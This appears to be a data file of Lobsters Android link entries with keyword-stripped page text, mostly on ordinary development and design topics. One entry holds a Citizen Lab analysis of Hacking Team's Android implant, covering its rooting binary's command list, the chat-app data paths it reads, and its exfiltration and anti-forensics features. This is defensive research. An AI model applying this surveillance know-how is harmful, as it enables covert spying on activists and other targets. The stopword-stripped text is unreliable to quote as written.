used highlight core interaction note color draw attention play button play button hit transform bigger ui pane color controlsnow even harder partas smart elegant material design shame nonetheless see android user innovation o inevitably bogged lack integration hardware maker mean material design make way onto tablet handset likely adulterated watered older phone never see option upgrade due backwards compatibility issue effort duarte team never seen user way intended duarte team hoping communicating better developer documenting design process extreme detail system least adapted purer waysit must weigh duarte limited fundamental fashion sanguine far android come mention material design seems like final realization promise web o showed ask feel like finally able ship coherent product fully rational user experience bogged legacy cruft people say actually kind make mad look far come say duarte creating ice cream like captain warship call engine room ship turn minute later creating material design like admiral pacific fleet making decision knowing nothing would move hour case three year
501,Lobsters,android,Android,"And Now, Your 'L' API Change WTFs",http://commonsware.com/blog/2014/06/28/and-now-your-l-api-change-wtfs.html,l api change wtfs,l api change wtfs poorlystructured zip archive disclosure significant note note action bar navigation form deprecated deprecated requires explicit update according alex curran deprecated pattern deprecated klassbook,l api change wtfs android release google issue api difference report outlining thing added changed removed new api level compared previous one whatever reason developer difference report published along javadocs poorlystructured zip archive always review see different beyond sort change get disclosure coverage google io presentation etc significant change note analysis based preview entirely possible thing revert back previous implementation time ship android whatever call hence blog post represent area concern sure doublecheck shipping version actually ship note android mean think better solution guarantee support indefinitely moment least note regression bolded action bar navigation form deprecated includes action bar tab dropdown navigation include view eg browser address bar suppose eliminates concern behavior action bar part reason action bar pulled something readily manipulable u developer activity setactionbar method taking toolbar parameter toolbar basically look like simplified action bar placed arbitrary spot elsewhere view hierarchy contrast lockedtothetop action bar activity across guessing tied new extension include document side effect new flavor onsaveinstancestate kin activity allow u populate bundle persistablebundle latter presumably survives reboot getrecenttasks getrunningtasks activitymanager deprecated return reduced result set l higher device batterymanager give u ability directly access battery information without fuss registering null receiver actionbatterychanged bindservice requires explicit intent targetsdkversion set l higher would consider using implicit intent code smell anyway using service forewarned update according alex curran break inapp purchasing iap integration code getexternalmediadirs bit like getexternalfiledirs represent directory scanned mediastore boatload new stuff added devicepolicymanager using device admin apis fragmentbreadcrumbs deprecated six using class new launcherapps class help simplify finding relevant launchable activity tied new managed profile system mediastore augmented mediastoreaudioradio largely undocumented unclear referring streaming radio station classic broadcast radio eg fm something else toplevel pattern pattern deprecated presumably reflecting fact number toplevel domain expanding rapidly android amount tracking save ispowersavemode powermanager actionpowersavemodechanged broadcast whether oemspecific mode new common power save framework android say might first something specifically installnonmarketapps settingssecure moved back settingsglobal websettings let control mixedcontent mode referring whether webview load insecure content secure origin many change well particularly one tied change l one caught eye interested learning kotlin check klassbook kotlin language lesson run right browser jun
502,Lobsters,android,Android,Citizen Lab Report: Police Story -- Hacking Team’s Tradecraft and Android Implant,http://citizenlab.org/2014/06/backdoor-hacking-teams-tradecraft-android-implant/,citizen lab report police story hacking team tradecraft android implant,summary introduction previous research gamma group global scanning effort country mamfakinch morocco ahmed mansoor uae esat malaysia part android hacking team backdoor saudi arabia protest saudi arabia qatif including predominantly shia qatif governorate violence arrest others allegedly killed prosecutor demanded face death sentence additional punishment mandated sharia law heinous offence dead body defiled hanged pole reuters sentence including death politically motivated url blocking harassed imprisoned blocked entering surveillance monitoring information control saudi arabia specific user whole platform used prosecute online dialogue male guardian receive text message woman arrive premise international airport campaign electronic army progovernment individual year prison lash human right organization commentator international human right community penetration rate individual income allowing device saudi network seeking assistance accessing encrypted traffic seeding lure political subtext developing deploying implant luckycat campaign tibetan activist uyghur community hacking team sample malicious apk code signing code signing certificate additional sample permission capability behavior network communication obfuscation implant configuration previous work rooting exploit background rooting android device applies rcs android implant rilcap functionality encryption algorithm appendix b functionality attempt access party chat voice apps facebook viber whatsapp skype line qq obfuscation implant configuration dexguard implant module functionality antianalysis functionality anti forensics call camera chat clipboard conference crisis device keylog livemic position screenshot url mail mm sm cell wifi bandwidth part hacking team rcs operation research architecture hacking team rcs deployment appendix distributed hacking team rcs architecture player system operation developing deploying implant melted application installation package exploit local installation infection scout agent agent implant module functionality event sub action selection available surveillance module accessed file address book application used calendar contact device type file accessed keylogging saved password mouse activity record call call data screenshots take photograph webcam record chat copy clipboard record audio microphone realtime audio surveillance device position url visited create conference call infect device capability synchronizing data exfiltration technician specify login credential apn used exfiltrate data antianalysis functionality anti forensics wipe uninstall code signing certificate verisign thawte godaddy http wwwtrustcenterdeenproductstc publisheridforsymbianhtm signuplivecom http devwindowsphonecomenusjoin http productswebsecuritysymanteccomordersenrollmentmicrosoftcertdo android specific issue hacking team helpfully note default apk file implant appears normal application named deviceinfo display device information anonymizer proxy chain architecture appendix distributed hacking team rcs architecture licensing update auditing analyst eye view mongodb hacking team extensively represented possible hacking team rcs exposing highly sensitive investigation data government client google making use google map api display map successful traffic analysis evolving terminology invisibility conclusion gamma group hacking team linked spain miniduke allegedly acknowledgement appendix distributed hacking team rcs architecture appendix b list rilcap command systembinrilcap footnote http developerandroidcomreferenceandroidmanifestpermissionhtml http developerandroidcomaboutdashboardsindexhtml,left newspaper might whine bit guy station give shit dispatch call doin something wicked siree jack givin ticket police truck dead kennedy summary part analyze newly discovered android implant attribute hacking team highlight political subtext bait content attack context part expose functionality architecture hacking team remote control system rcs operator tradecraft neverbefore published detail introduction report analyzes hacking team android implant us new document illustrate remote control system rcs interception product work work build previous research technology company behind lawful interception malware technology marketed filling gap passive interception network monitoring physical search essence malware sold government unlike phone monitoring physical search however country legal guideline oversight use new power light absence guideline oversight together clandestine nature technology uniquely vulnerable misuse analysing tool proliferation hand company like hacking team gamma group hope support effort ensure tool used accountable way violate basic principle human right rule law report published earlier year presented result global scanning effort identified country deployment hacking team remote control system monitoring solution addition alongside researcher uncovered range case lawful interception software used political target repressive regime political civil society target included mamfakinch morocco human right activist ahmed mansoor uae esat usbased news service focusing ethiopia case tool marketed law enforcement used political rather security threat still case like malaysia pdf found bait document seeding suggestive political targeting part android hacking team backdoor saudi arabia protest saudi arabia qatif saudi arabia seen protest comparable elsewhere arab spring experienced protest since primarily ashsharqīyah province number reason political tension ranging demographic pressure cost housing unemployment issue woman minority right province predominantly shia longstanding grievance perceived political cultural marginalization sunni ruling regime grievance magnified early bahraini government violently suppressed shia protest assistance saudi arabian troop protest spread number area including predominantly shia qatif governorate shia protester appear initially demanded reform rather regimechange advocated arab country interestingly qatif history shia protest famously widespread protest response protest demanded greater political economic participation regime provided extensive economic concession however authority responded violence arrest prominent shia figure protester wounded others allegedly killed security force according human right watch crackdown may contributed shifting protester demand today explicitly demand regime change using secular language according researcher journalist directly familiar recent development spoke u might described inflammatory response saudi authority also arrested outspoken highly visible shia sheikh prosecutor demanded face death sentence additional punishment mandated sharia law heinous offence dead body defiled hanged pole escalation accompanied violence security service among shia used regime justify harsh measure including riot control arrest sentence including death protester charge sedition others charged espionage behalf iran case claimed many shia politically motivated human right organization catalogued alleged abuse like adala center human right denied ability register formal organization subject url blocking staff harassed imprisoned journalist attempting report qatif blocked entering regularly subjected threat government pressure social medium mobile phone key part protest organized protester taking measure like using pseudonymous account share message nevertheless according people familiar event digital operational security practice often piecemeal match capability security service surveillance monitoring information control saudi arabia saudi arabia unique complex security environment security service play range role one hand saudi arabia face undeniable foreign domestic security threat hostile group extremist government hand regime exceptionally aggressive attempt control stifle dissent political pluralism security service saudi arabia make use range instrument formal informal state power control electronic information environment country beginning governmentmaintained internet chokepoint extending isps state block wide range political religious cultural content includes social medium whether specific user whole platform extending state requires news website defined broadly register authority registered website subject extensive regulation unregistered operator registered risk severe penalty site operator encouraged selfmonitor moderate content threat financial penalty jail time corporal punishment like lash addition anticybercrime legislation also used prosecute online dialogue society would consider acceptable political speech public use mobile monitoring extends form social control many society would find highly objectionable example government earned international condemnation announced would implement system enable male guardian monitor travel behavior woman care replacing older permissionslip based system yellow card male guardian receive text message woman arrive premise international airport asking whether woman permitted travel internet social medium user encouraged selfcensor report government engages public advertising campaign encourage behaviour make clear saudi citizen watching listening particular state implemented specific penalty resharing privately publicly content deemed objectionable addition using explicit tool law widely believed state encourages electronic army progovernment individual swamp social medium conversation proregime voice harass dissenter speech involving religious theme especially risky government willing use serious religious charge including death penalty corporal punishment tool international jurisprudence like extradition detain punish violate strict norm political religious cultural speech two notable case operator saudi liberal discussion forum eventually sentenced year prison lash maintaining forum discussion religion reform reduction sort prosecution demanded execution many similar case using various charge reported human right organization commentator measure intentionally chilling effect political speech regularly subject criticism international human right community nevertheless social medium remains primary outlet political speech many user practice degree self censorship indirect speech others use pseudonym technical mean preserve anonymity access banned content use virtual private network vpns also common response security service use police investigative power unmask poster punishes severely sometimes arrest name detainee kept secret phone use saudia arabia penetration rate estimated average individual income spent mobile phone internet cost result older mechanism internet surveillance like monitoring internet cafe replaced individual user required use real identity registering mobile device clear state seeking greater visibility encrypted traffic example saudi arabia successfully gained access blackberry communication making saudilocated server quidproquo allowing device saudi network recently government appetite encrypted communication revealed moxie marlinspike security researcher developer received overture saudi telecom company mobily seeking assistance accessing encrypted traffic firm seeking intercept solution request saudi government said access range mobile chat client viber line whatsapp well mobileversion twitter use mobile malware understood part desire mean limited saudi arabia match technology use population seeding lure political subtext using signature developed part ongoing research lawful intercept malware developed hacking team identified suspicious android installation package apk file functional copy qatif today القطيف اليوم news application bundled hacking team payload document reviewed suggest hacking team refers kind mobile implant installation package legitimate third party application file bundled implant see developing deploying implant kind tactic android package implant seen targeted malware attack use commercial lawful intercept product including luckycat campaign attack tibetan activist group uyghur community genuine qatif today app android download iphone application provides news information arabic special relevance qatif governorate saudi arabia qatif today google play app store connection qatif interesting given recent history protest qatif outlined position determine identity group individual targeted malware however speculate attack may linked political protest eastern saudi arabia hacking team sample malicious apk qatifnewsapk following hash time first submission virustotal database file detected zero antivirus product virustotal appears apk name seeded twitter day later twitter account bhpearl linked bahrain country great interest shia qatif tweet link bhpearl since deleted tweeted link shortened using googl service resolved http http first link itunes store click shortened link appears legitimate second link however redirect genuine app android app store instead redirects dropbox file since removed examination analytics shortened second link interesting click discount click u germany researcher three saudi arabia one click taiwan may vpn security researcher google shortener analytics confirm file dropbox apk suspect timing tweet use nonstandard method sharing android application coincidence malicious apk code signing malicious apk signed following certificate issuer dn cu osun oujavasoft cnserver c u cn server sun ou javasoftsubject dn cu osun oujavasoft cnserver c u cn server sun ou javasoftserial fingerprint broader discussion codesigning practice hacking team implant discussed later document section code signing certificate additional sample able identify additional six sample signed certificate first sample list submitted virustotal date file name submitter id submitter country rcsapk api germany interestingly first sample chronologically submitted virustotal group file name rcsapk appears abbreviation name hacking team targeted surveillance solution remote control system permission original app requires following permission androidpermissioninternet androidpermissiongetaccounts androidpermissionwakelock androidpermissionreadphonestate androidpermissionaccessfinelocation androidpermissionusecredentials androidpermissionwriteexternalstorage androidpermissionaccessnetworkstate androidpermissionvibrate implant request following permission give ability process call read write sm message monitor user gps location androidpermissionaccesscoarselocation androidpermissionaccesswifistate androidpermissioncallphone androidpermissioncamera androidpermissionchangenetworkstate androidpermissionchangewifistate androidpermissionflashlight androidpermissionprocessoutgoingcalls androidpermissionreadcalendar androidpermissionreadcontacts androidpermissionreadlogs androidpermissionreadphonestate androidpermissionreceivebootcompleted androidpermissionreceivesms androidpermissionrecordaudio androidpermissionsendsms androidpermissionsetwallpaper androidpermissionuserpresent androidpermissionwritesms following permission requested several identified hacking team android implant androidpermissionwriteapnsettings write access point name setting value allows application change apn access point name setting mobile phone identifies external network phone access data value marked use third party application android developer discussion functionality see capability behavior network communication analyzing behavior application able confirm malicious nature file executed app performs post http iphonealmotamizcomqatiftodaygcmsregisterphp server hosted iweb montreal ip address host location ca canada city montréal qc organization iweb technology isp iweb technology number iweb technology inc believe legitimate communication decoy application also observed command control communication two additional server later found ip address decrypted text implant config file see obfuscation implant configuration incidentally consistent hacking team implant store address http http first server hosted leaseweb germany host location de germany organization leaseweb germany gmbh previously netdirekt e k number leaseweb bv second hosted linode japan ip address host location jp japan organization kddi corporation number kddi kddi corporation previous work identified leaseweb linode ip part hacking team proxy chain uncovered prior reporting time also identified third ip belonged group finding indirectly validates method used previous report highlight third ip likely part collection infrastructure additional ip block owned hosting provider softlayer technology rooting exploit malicious implant attempt stat following file devexynosmem devdspbridge behavior consistent known exploit permit user without permission write compromised device physical memory depth analysis exploit provided azimuth security exploit would effective latest version android operating system high percentage user still use legacy version may image credit google background rooting android device rooting android phone typically involves two component su binary supervisor application order install su binary either device manufacturer allowed boot loader unlocked vulnerability exploited temporarily elevate permission su binary installed application may use controlled way elevate permission purpose su much like traditional unix us suid flag application call elevate permission executable calling case including one root application android run user order prevent application accessing resource permission supervisor application usually superuserapk used people intentionally root phone su binary call supervisor notify user allow approve deny privilege escalation thus even rooted phone user still notified application perform action requiring root access applies rcs android implant case vulnerability exploited initially gain root access binary dropped copy systembinrilcap procselfexe set owner root well setting executable suid flag allows persistent root access systembinrilcap rilcap functionality examination binary revealed basic technique simple encryption string used hinder analysis encryption algorithm str b n len b b b b b n b b b b b b b b b binary contains following functionality capture information framebuffer used assemble screenshots kill volume daemon automatically detects mount storage device added mount system read read write check procmounts sdcard execute command unprivileged application using system execute command file using execv systembinsh modify datasystemdevicepoliciesxml add application device admin copy file modify file permission change file owner unlink self restart device functionality allows rilcap act su binary would supervisor application notify user privilege escalation offer choice allow deny full list command found appendix b functionality looking sample group identified range behavior indicative implant surveillance capability attempt access party chat voice apps found apps attempt access local file stored popular social medium chat call apps including facebook viber whatsapp skype line qq datadatacomfacebookkatanadatabases datadatacomfacebookorcadatabases datadatacomskyperaiderfilessharedxml datadatacomwhatsappsharedprefs datadatacomwhatsappsharedprefsregisterphonexml datadatacomvibervoipfiles datadatacomtencentmmmicromsg datadatacomvibervoipfilespreferencesregviberphonenum datadatajpnaverlineandroiddatabasesnaverlinemyhome datadatajpnaverlineandroid datadatajpnaverlineandroiddatabases addition app access locally stored mail file belonging compromised user mail account datadatacomgoogleandroidgmdatabasesmailstore username gmailcomdb obfuscation implant configuration order prevent additional scrutiny internals backdoor source code appears heavily obfuscated use dexguard similar provide encryption string entire class asset considerably slowing complicating reverse engineering process analyzing implant deobfuscated configuration file highlight number line match functionality rcs complete list see implant module functionality find range audio recording camera video key logging live mic chat device info etc configuration setting relevant surveillance functionality implant also note presence crisis module provides antianalysis functionality explained see antianalysis functionality anti forensics record true compression buffer module call module camera quality med module chat module clipboard module conference number synchronize false position true module crisis mic true network process enabled false call true camera true hook process enabled true module device list false module keylog module livemic number also see appear location screenshottaking browsing activity module cell true gps false wifi true module position quality med module screenshot onlywindow false module url also found implant seems deployed filter specify date range datefrom dateto mail sm mm message seeking mail filter datefrom maxsize dateto history true enabled true mm filter datefrom dateto history true enabled true module message sm filter datefrom dateto history true enabled true also see information implant exfiltrates data along server interestingly appears implant capable monitoring device connectivity eg wifi cellular network choosing connection type rate limiting bandwidth note server observed implant network communication desc sync subactions host mindelay stop true cell true action synchronize wifi true maxdelay bandwidth host mindelay stop false cell true action synchronize wifi true maxdelay bandwidth part hacking team rcs operation released research hacking team earlier year sent documentation anonymous individual pertaining set operation hacking team rcs hacking team provides customer document appear date fall knowledge origin document whoever sent took step conceal identity authenticity document unverified identified inconsistency currently known hacking team rcs latest finding included concerned however releasing document full form could bring risk source following thus general overview functionality specific remote control system according document screenshots excerpt clearly instance marked demo copy rather actual operation architecture hacking team rcs deployment following image suggests logical architecture prototypical hacking team rcs deployment specific instance according document distributed architecture used see appendix distributed hacking team rcs architecture image source hacking team rcs hacking suite governmental interception system administrator guide player system operation according document rcs series defined role responsibility permission system brief system administrator appears receive training hacking team contract phase well system administration task including installing updating rcs server network well network injector administrator creates account creates operation designates target technician responsible creating implant named agent documentation managing network injector analyst handle output system perform intelligence analysis via rcs console developing deploying implant according document software create full range implant factory compiled specifically investigation technician responsible creating agent using factory prompt presented technician image technician preparing mac osx implant image source hacking team rcs hacking suite governmental interception technician guide technician range option factory well additional ability use network injection pictured option include network injection via injected malicious traffic cooperation isp tactical network injection lan wifi melted application bundling hacking team dropper alongside bait application installation package mobile installer exploit documentbased exploit mobile desktop local installation mobile installation via usb sd card offline installation create iso bootable sdhc cd usb option includes ability infected hibernated powered device qr code mobile link pictured infect target applet web likely malicious website depreciated v silent installer desktop executable install implant infected usb autoinfecting usb wap push message target infected user accepts message work mobile operating system apart io infection scout agent agent document indicate rcs make use scout agent commonly known validator help determine whether full implant agent installed thin implant collect screenshots device information determine whether target interest document suggest hacking team explicitly concerned possibility implant could become unmasked instructs technician function scout agent determine whether system safe infect whether could risk unmasking agent system determined safe infect scout agent replaced full implant according document hacking team advises user gradually add functionality implant implant exfiltrate data receive instruction process called synchronizing implant module functionality implant agent offer oneclick functionality requesting information target device technician encouraged add functionality needed image source hacking team rcs hacking suite governmental interception technician guide addition advanced approach taken allowing sophisticated technician determine specific sequence module activation upon infection using graphical flow model allows user define event trigger particular action subactions module sequence document provide example sequence event device connected power adaptersub action send sm begin logging position disable event keyed sim card change image source hacking team rcs hacking suite governmental interception technician guide selection available surveillance module accessed file address book application used calendar contact device type file accessed keylogging saved password mouse activity intended defeat virtual keyboard record call call data screenshots take photograph webcam record chat copy clipboard record audio microphone additional voice silence detection conserve space realtime audio surveillance live mic module available window mobile device position url visited create conference call silent party infect device depreciated since v capability implant operational collection operation updated addition file sent received device addition implant default cap evidence space target device recording new material stop space reached operator also ability delete notyettransmitted data device synchronizing data exfiltration synchronizing process number step paraphrased authorization implant server time syncing implant rcs server implant removal case specified closed technician implant configuration update implant downloads material sent rcs server upload rcs server download cue material upload rcs server evidence combined secure delete additional secure deletion evidence mobile desktop version slightly different parameter desktop implant bandwidth delay sending material added mobile setting unique feature technician force type data channel wifi cell network implant us update interestingly technician specify login credential apn used exfiltrate data allows implant avoid incurring data charge displaying traffic victim feature specified available blackberry symbian o version rcs antianalysis functionality anti forensics functionality referred crisis allows action detection hostile activity document give example packet sniffer functionality triggered range scenario number option based identifying process desktop version option including pausing synchronizing hooking program mobile version option includes pausing audio camera location collecting synchronizing wipe also triggered according document hacking team informs user leave trace implant uninstall action several feature could interest forensic analysis potentially infected device uninstall blackberry trigger automatic restart ii uninstall android device root successfully gained result user prompt requesting permission uninstall iii window phone uninstall deletes file remove application icon list program code signing certificate rcs designed incorporate code signing creating implant document helpfully suggest verisign thawte godaddy source code signing certificate addition document encourage user contact hacking team technical support assistance obtaining certificate interesingly symbian user instructed purchase developer certificate directly trustcenter even provides url http wwwtrustcenterdeenproductstc publisheridforsymbianhtm infecting window phone user encouraged register microsoft account signuplivecom window phone dev center account http devwindowsphonecomenusjoin document indicate hacking team concerned ensuring user correctly manage approval process managed symantec instructs user promptly reply phone email communication symantec user also get instsructions obtain enterprise mobile code signing certificate http productswebsecuritysymanteccomordersenrollmentmicrosoftcertdo android specific issue order run module chat message screenshot android implant requires root privilege device case acquisition root privilege unsuccessful victim manually asked give application root access addition case root successfully acquired android device victim see prompt requesting permission uninstall triggered hacking team helpfully note default apk file implant appears normal application named deviceinfo display device information anonymizer proxy chain architecture image highlight system administrator see distributed proxy chain see appendix distributed hacking team rcs architecture collector architecture image source hacking team rcs hacking suite governmental interception system administrator guide licensing update time creation collection architecture license file hacking team required software according document license required specific functionality well developed analysis toolkits document suggest hacking team maintains update cycle product updating process performed system administrator using update provided hacking team includes update collection injector infrastructure implant auditing program appear basic logging function auditing capability allowing authorized administrator view log user action throughout system including interaction implant capability appears developed make toolkit compatible evidence requirement digital material note however ease evidence log implant factory irreversibly deleted authorized user analyst eye view image graphically show way multiple device single target may compromised simultaneously monitored image source hacking team rcs hacking suite governmental interception analyst guide analyst perform search data using text string well filtering sorted data addition analyst flag data importance well apply automated rule flagging data data storage make use open source mongodb documentation indicates hacking team rcs us mongodb next also demo instance see information exfiltrated target computer note use basic color coded flagging system red green yellow flag evidence well kind information available analyst capture see screenshots particular program operation eg running blackberry desktop software skype well location information address location information identical publicly available address hacking team image source hacking team rcs hacking suite governmental interception analyst guide following image see analyst console playing back intercepted skype call image source hacking team rcs hacking suite governmental interception analyst guide following image see live browsing infected system file tree functionality enabled certain case image source hacking team rcs hacking suite governmental interception analyst guide image show map timeline view position infected device interestingly image used instructional illustration appears hacking team might inadvertently revealed information demonstration u law enforcement customer specifically location jimmy page device map accesscontrolled parking lot la county sheriff appears stamped date sept december may coincidental hacking team extensively represented i world held later september u image source hacking team rcs hacking suite governmental interception analyst guide use google map tool provides graphic view target however may present serious breach operational security client including betraying location data ongoing investigation even point data transmitted google need know map centroid hence target location deliver map data possible hacking team rcs exposing highly sensitive investigation data government client google making use google map api display map addition google map traffic even using ssl subject successful traffic analysis third party past demonstrated vulnerability believe possibility warrant investigation beyond collection data document indicate hacking team offering basic investigation management toolkit including basic link analysis feature purchase additional license software build basic link analysis using peer contact entity like call know one individual found others phone book link system also automatically attempt create identity link detail shared entity eg phone number timeseries locational data also displayed image source hacking team rcs hacking suite governmental interception analyst guide evolving terminology document suggest hacking team made number change language us describe tool found example used term backdoor refer implant changed term v agent similarly changed term backdoor class factory time period invisibility according document hacking team appears supply customer invisibility report rcs solultion example reviewed version invisibility report silent installer melted application network injector injectexe attack offline cd document informs customer test performed default window installation image source version invisibility report undated conclusion hacking team remote control system surveillance malware toolkit marketed lawful interception use identified analyzed rcs android implant lure political subtext suggesting target qatif governorate saudi arabia analysis implant revealed range surveillance function past several year researched gamma group hacking team exposing global proliferation highlighting technology tactic use interest group create sophisticated implant indeed since aurora incident many public report sophisticated malware used nation state example turla campaign attributed russia described one complex cyber espionage program uncovered date additional campaign note include careto linked spain pdf miniduke meanwhile significant analysis public discussion gone stuxnet duqu flame allegedly product u israeli collaboration highimpact typically high development cost implant kit appear used exclusively country attributed designed perform targeted intrusion hacking team gamma group different several reason first software available country provided pay second software marketed target everyday criminality security threat whereas statesponsored campaign outlined designed support espionage operation hardened highvalue target type exceptionally invasive toolkit costly boutique capability deployed intelligence community military available handful government unstated assumption customer pay tool use correctly primarily strictly overseen legal purpose research shown however dramatically lowering entry cost invasive hardtotrace monitoring equipment lower cost targeting political threat access hacking team gamma group toolkits acknowledgement seth hardy sarah mckune marcia hoffman sebastian porst masashi cretenishihata bill marczak ron deibert human right watch abeer allam several journalist researcher generous time appendix distributed hacking team rcs architecture image show distributed hacking team rcs collection infrastructure according document image source hacking team rcs hacking suite governmental interception system administrator guide appendix b list rilcap command command provided systembinrilcap volkill volume daemon vold blr mount system readonly blw mount system readwrite rt clone self systembinrilcap permission qzx command args pass argument system fhc source destination copy file pzm permission flag file modify file permission qzs read command file named qzs execute execv systembinsh reb reboot adm name add name devicepoliciesxml ru unlink self fho user user filename modify file owner sd check mount sd card path hardcoded mntsdcard always work fb file copy frame buffer file screenshots footnote developerandroidcomaboutdashboardsindexhtml
503,Lobsters,android,Android,Google New Material Design concept - intuitive metaphors allowing the mind to work less,http://blogs.telerik.com/blogs/14-06-26/google-new-material-design-concept-intuitive-metaphors-allowing-the-mind-to-work-less,google new material design concept intuitive metaphor allowing mind work le,card ui future mobile component learn telerik ui android,yesterday google presented material design concept underlying design system allows unified experience across platform device size natural evolution path google last year disclosed new ui framework using card ui heart showed helped achieve design scale across device web yesterday presented material design concept musthave resource android developer designer providing systematic detailed guideline design interaction fundamental animation color typography layout principle structure component essential pattern get core material design concept android team analyzed visual language unifies classic concept good design solid understanding fundamental physical property said matias duarte google director android user experience team chose use metaphor paper surface unifying principle people long history interacting paper surface physical exist world team relied tangible metaphor user understand intuitively accelerate understanding ui surface intuitive use foundation said duarte presentation organize space rationalize interaction allows make mind work le watch presentation elaborates thinking guided android team create visual language two month ago asked rhetorical question card ui future mobile today card one component part material design concept soon dominating design pattern across android design landscape click learn material design download resource click learn telerik ui android suite native component chart calendar appfeedback
504,Lobsters,android,Android,"Introducing the all-new 7"" tablet from Google",http://www.google.com/nexus/7/,introducing allnew tablet google,,
505,Lobsters,android,Android,Go support for Android,https://docs.google.com/document/d/1N3XyVkAP8nmWjASz8L_OjjnjVKxgeVBjIsTr5qIUcA4/mobilebasic?pli=1&viewopt=127,go support android,,go support androiddavid crawshawjune propose introduce go support android platform focus supporting game written go apis defined android ndkbackgroundandroid operating system designed running apps app relies far platform library service provided traditional unix operating system mean direct port go runtime android without new apis would particularly usefulproviding go equivalent android platform intractable platform written java huge api surface attempt wrap apis go would give undesirable result manually built wrapper would lag feature automatically generated wrapper would lead ugly go either way would slowthere however subset android apps written much smaller cbased api surface provided android ndk game feasible build go support android providing equivalent feature found ndkproposalduring go cycle goosandroid introduced go repository along cgo support android contributed elia naur dalvikartloadable file produced using external linker provided android ndkfor build dashboard maintain crosscompiling builder run go tool linux host us adb tool run test binary stock android devicewe introduce subrepository gomobile house binding opengl opensl openmax exported android ndk java go language binding generator given go package let java code call game menu uis built standard sdk go defines binding also make possible use code bind language like objective c android studio build system integrationbinary release provided project stabilized
506,Lobsters,android,Android,NES Emulator for Android written in Go,https://github.com/scottferg/Fergulator-Android,ne emulator android written go,fergulatorandroid http githubcomscottfergfergulator build instruction goandroid apk,fergulatorandroid android port ne emulator written go majority emulation code life original repository http githubcomscottfergfergulator build instruction need local environment goandroid project toplevel directory build apk apk download available
507,Lobsters,android,Android,Why mobile developers should care about deep linking,http://developer.telerik.com/products/why-developers-should-care-about-deep-linking/,mobile developer care deep linking,prepage rank phase deep linking type apps benefit deep linking practical benefit deep linking card ui becoming hot mobile deep linking resource apple resource android resource general resource party solution twitter google adding deep linking google post shared android app facebook learn ui io feature,user spending hour minute per day mobile device recently seen statistic revealing native app usage smartphones increasing expense mobile web industry mobile sale steadily increasing even eating web sale certain retailer hard believe huge fast growing native mobile apps market still prepage rank phase mobile developer marketer business owner ecosystem collect advanced performance data user discover content service efficiently deep linking help deep linking mobile deep linking methodology allows mobile apps communicate mobile web mobile apps via clickable link directing user specific landing page screen inside app instead sending back mobile site store deep linking help reduce conversion friction shortening user path piece content product promo interested type apps benefit deep linking apps shopping travel hotel booking music news ability send user specific product offer promo page tremendous effect conversion rate ultimately revenue deep linking enabled user navigated directly certain hotel booking page seen advertisement instead app home page last year facebook announced deep linking ad format letting user come back familiar apps ad feed image source http another scenario might app post facebook behalf user deep link post user friend interact post directed inside app instead app store fitness apps another type benefit deep linking example let imagine app track run may run route view detail run one app let view google map detailed mapping info run could logged another fitness app designed keep track day deep linking work user app already installed right true deep linking benefit preinstalled new user solution example tapstream carry forward saved request user app installed heshe sent app store upon opening app installation directly taken deep linked page screen eliminating search requested content even deep linking used reengagement mechanism bring user back inside app enormous potential drive conversion roi practical benefit deep linking big use case deep linking email campaign existing user likely app already installed basically click away given promo exciting offer another use case social medium campaign share button help deep link able send user dedicated content overcoming limitation one generic starting point user app journey huge impact profitability mobile revenue deep linking get much cleaner read analytics user dropped optimal experience device therefore deflating bounce rate revealing accurate conversion rate mobile web say marketing director curated online menswear shop recently reported share mobile sale twitter announced month ago twitter card support deep linking allowing user download app installed navigate inapp content app installed device unfamiliar card ui previous blog post talked card ui becoming hot mobile brand google pinterest facebook twitter use deep linking resource established standard deep linking native platform guideline community effort establish standard also number party vendor offering advanced solution deep link analytics deferred deep link retargeting framework list useful resource developer interested learning deep linking apple resource android resource general resource party solution twitter google adding deep linking google post shared android app facebook already using deep linking mobile apps share thought comment section tried telerik ui io native control bridge missing functionality uikit framework learn ui io feature
508,Lobsters,android,Android,Easy Android Custom View Reuse in Eclipse,http://developer.telerik.com/products/easy-android-custom-view-reuse-in-eclipse/,easy android custom view reuse eclipse,ui android retired uwp xamarin kendo ui angular kendo ui react mean customer documentation resource telerik ui xamarin question address,ui android retired taking decision easy multiple factor taken consideration time changing mobile development trend native mobile application development become preferred method creating mobile apps io android existing crossplatform framework hardly compete always stood developer productivity believe road productivity paved skill reuse targeting multiple platform single code base deliver truly native application focusing product portfolio enhance productivity working popular rising development platform way continue provide best ui productivity tool help developer keep pace latest trend technology staying true calling increasing investment tooling around latest technology developer need includes net related product like uwp xamarin javascript offering kendo ui angular brandnew kendo ui react name mean customer effective immediately new feature product update accompanying documentation resource remain available understand might inconvenience strongly advice try telerik ui xamarin continue building crossplatform mobile application question address ready best answer question comment might drop u line reply soon possible
509,Lobsters,android,Android,Courier: Secure News reader,https://guardianproject.info/apps/courier/,courier secure news reader,http guardianprojectinfoarchivecourier,http guardianprojectinfoarchivecourier
511,Lobsters,android,Android,Create 3D parallax images from photos created with Google Camera's Lens Blur feature,http://depthy.stamina.pl/,create parallax image photo created google camera lens blur feature,,
512,Lobsters,android,Android,Is cards UI the future of mobile?,http://blogs.telerik.com/blogs/14-04-15/is-cards-ui-the-future-of-mobile,card ui future mobile,card hot recently ideal responsive design going responsive google play individual unit quickly consumable content serve party data twitter card advertising format blog post think card,card part everyday routine exchange business card holiday card play card u collect card participate actively digital experience well many big brand using heavily already google embracing cardsstyle interface across mobile web mobile search google google google map google play pinterest facebook twitter three social medium giant also moved card card hot recently think card rectangle html box module actually nothing new card modular piece content enable embedding rich medium fostering interactivity make card design unit choice many publisher extremely wellsuited mobile environment easy scan consume glance offer great capability user manipulation swipe stack flip pan fold group sort etc ideal responsive design one biggest benefit card bring design various device scalability different state compact normal expanded rendered variable position accommodate vertical horizontal stacking card economical solution designing building multiple device different screen size presentation going responsive google play google play team discus depth card helped achieve design scale across device web individual unit quickly consumable content mobile user attention span comparable young child matter using device home work front tv waiting queue delivering consistent experience card individual unit quickly consumable content leaving user satisfied end rather frustrated interrupted midway serve party data card already big impact mobile development serve data experience internal api design feel natural mobile also party api markup twitter example introduced twitter card advertising format going one step using card design container platform serving party content blog post discus detail power card deliver party information performance coming api think card plan using design pattern next mobile app see viable solution challenge responsive design project share feedback comment
